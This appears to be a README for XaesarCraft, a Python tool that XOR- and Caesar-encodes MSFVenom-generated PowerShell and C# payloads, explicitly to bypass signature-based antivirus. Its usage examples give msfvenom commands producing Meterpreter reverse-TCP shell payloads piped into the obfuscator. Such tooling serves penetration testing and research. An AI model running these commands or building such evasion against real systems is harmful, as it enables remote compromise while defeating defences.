# XaesarCraft

XaesarCraft is a powerful security tool that integrates XOR encryption and Caesar cipher capabilities, offering users a unique opportunity to manipulate and obscure payloads for PowerShell (PS1) and C# scripts generated through MSFVenom.

## Key Features:

1. **XOR Encryption**: XaesarCraft enables users to employ XOR encryption to obfuscate payloads. This is particularly useful for bypassing signature-based antivirus systems.

2. **Caesar Cipher**: Add an additional layer of encryption by applying the Caesar cipher to your payloads.

3. **Integration with MSFVenom**: Generate payloads using MSFVenom directly from within XaesarCraft, and then apply XOR and Caesar ciphers for encryption.

4. **Customization of Keys**: Specify your own keys for XOR encryption and select a shift for the Caesar cipher, creating unique and complex combinations.

## Example of usage:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py --mode rot # default ROT13
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f ps1 | python3 XaesarCraft.py --m rot --n 0x13
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f ps1 | python3 XaesarCraft.py # default XOR 0xfa
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py --m xor -n 0x13
```

TBD:

 **Export**: Export encrypted payloads in various formats, including Base64, HEX, and bin.


## Target Audience

Designed for security researchers, penetration testers, and cybersecurity specialists, XaesarCraft offers comprehensive solutions for effectively creating and obscuring payloads, ensuring high levels of anonymity and protection.
